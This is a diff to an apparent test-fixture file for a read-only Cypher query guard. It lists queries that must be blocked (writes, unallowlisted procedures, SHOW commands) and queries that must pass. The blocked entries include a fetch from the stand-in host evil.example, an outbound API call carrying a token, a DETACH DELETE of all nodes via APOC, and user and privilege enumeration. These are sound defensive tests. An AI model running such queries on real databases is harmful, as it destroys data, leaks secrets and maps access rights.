@@ -166,6 +166,80 @@ BLOCKED: tuple[tuple[str, str, str], ...] = (
         "unbalanced-quote",
     ),
     ("empty", "   \n  ", "empty"),
+    # --- GQL. 2026.06 speaks it, and its write verb is not CREATE. Until this line the
+    # deny-list did not know the word and the `EXPLAIN` plan was the only layer that
+    # refused it; `PLAN_BLOCKED` below keeps that proof running.
+    ("insert-gql", "INSERT (n:_GuardTmp {a: 1}) RETURN n.a AS a", "write-verb"),
+    (
+        "insert-gql-after-match",
+        "MATCH (c:Chunk) WITH c LIMIT 1 INSERT (n:_GuardTmp {id: c.id}) RETURN n.id AS id",
+        "write-verb",
+    ),
+    # --- a namespace nobody allowlisted, because nobody had heard of it
+    (
+        "unknown-namespace-procedure",
+        "CALL n10s.rdf.import.fetch('http://evil.example/x.ttl', 'Turtle') "
+        "YIELD terminationStatus RETURN terminationStatus",
+        "procedure-not-allowed",
+    ),
+    (
+        "unknown-namespace-function",  # an outbound HTTP call from inside a read query
+        "RETURN genai.vector.encode('secret', 'OpenAI', {token: 'sk-x'}) AS v",
+        "procedure-not-allowed",
+    ),
+    (
+        "bare-procedure",
+        "CALL sleep(60000) YIELD value RETURN value",
+        "procedure-not-allowed",
+    ),
+    # --- backticks quote an identifier; they do not rename it
+    (
+        "backticked-procedure",
+        "CALL `apoc`.`periodic`.`iterate`('MATCH (n) RETURN n', 'DETACH DELETE n', {}) "
+        "YIELD batches RETURN batches",
+        "procedure-not-allowed",
+    ),
+    (
+        "backticked-function",
+        "RETURN `apoc`.`cypher`.`runFirstColumn`('CREATE (n:Foo) RETURN 1', {}) AS x",
+        "procedure-not-allowed",
+    ),
+    # --- SHOW: the server and its people are not the graph
+    ("show-settings", "SHOW SETTINGS YIELD name, value RETURN name, value", "show-not-allowed"),
+    (
+        "show-transactions",
+        "SHOW TRANSACTIONS YIELD transactionId, currentQuery RETURN transactionId, currentQuery",
+        "show-not-allowed",
+    ),
+    ("show-users", "SHOW USERS YIELD user RETURN user", "show-not-allowed"),
+    (
+        "show-privileges",
+        "SHOW PRIVILEGES YIELD access, action RETURN access, action",
+        "show-not-allowed",
+    ),
+    (
+        "show-procedures",  # reconnaissance: which of the allowlist's neighbours are installed
+        "SHOW PROCEDURES YIELD name WHERE name STARTS WITH 'apoc' RETURN name",
+        "show-not-allowed",
+    ),
+    ("show-functions", "SHOW FUNCTIONS YIELD name RETURN name", "show-not-allowed"),
+    ("show-databases", "SHOW DATABASES YIELD name RETURN name", "show-not-allowed"),
+)
+
+#: Cases the static scanner is *not* asked to catch on its own: they are planned by the
+#: server and refused because the plan contains a write operator. `INSERT` is the reason
+#: this table exists — on 2026.06 it was a write verb the deny-list had never heard of, and
+#: layer 3 is what refused it. Deleting the case after adding the word to `WRITE_TOKENS`
+#: would delete the evidence that the third layer does any work; the live test runs these
+#: with the deny-list switched off, which is the only way to see it.
+PLAN_BLOCKED: tuple[tuple[str, str, str], ...] = (
+    ("plan-insert", "INSERT (n:_GuardTmp {a: 1}) RETURN n.a AS a", "write-plan"),
+    ("plan-create", "CREATE (n:_GuardTmp {a: 1}) RETURN n.a AS a", "write-plan"),
+    (
+        "plan-set",
+        "MATCH (n:Chunk) WITH n LIMIT 1 SET n.poisoned = true RETURN n.id AS id",
+        "write-plan",
+    ),
 )
 
 #: Ordinary read queries. All of these must pass the static guard untouched (except for a
@@ -224,4 +298,28 @@ ALLOWED: tuple[tuple[str, str], ...] = (
     ("hebrew-literal", "MATCH (c:Chunk) WHERE c.text CONTAINS 'רכיב' RETURN c.id AS id LIMIT 3"),
     ("property-named-like-a-verb", "MATCH (n:Chunk) RETURN n.text AS text, n.at AS at LIMIT 1"),
     ("count", "MATCH (n:Chunk) RETURN count(n) AS chunks"),
+    # Filtered by name on the server, per the Plan 1 review lesson about database-wide
+    # reads: a reader may look up the index behind their own query, not survey the server.
+    (
+        "show-indexes",
+        "SHOW INDEXES YIELD name, state WHERE name STARTS WITH 'chunk' RETURN name, state",
+    ),
+    (
+        "show-constraints",
+        "SHOW CONSTRAINTS YIELD name WHERE name STARTS WITH 'chunk' RETURN name",
+    ),
+    # `LIMIT` cannot be appended to either of these; `inject_limit` leaves them alone and
+    # `run_cypher` bounds the row list instead.
+    (
+        "union-read",
+        "MATCH (d:Document) RETURN d.key AS key LIMIT 3 "
+        "UNION MATCH (w:WorkItem) RETURN w.key AS key LIMIT 3",
+    ),
+    ("finish", "MATCH (c:Chunk) WHERE c.id IS NOT NULL FINISH"),
+    # Cypher's own namespaced value functions: dotted, allowlisted by root, side-effect free.
+    (
+        "builtin-duration-function",
+        "MATCH (w:WorkItem {key: $key})-[:HAS_CHANGE]->(s:StatusChange) "
+        "RETURN duration.inDays(w.created, s.at).days AS days ORDER BY days LIMIT 3",
+    ),
 )
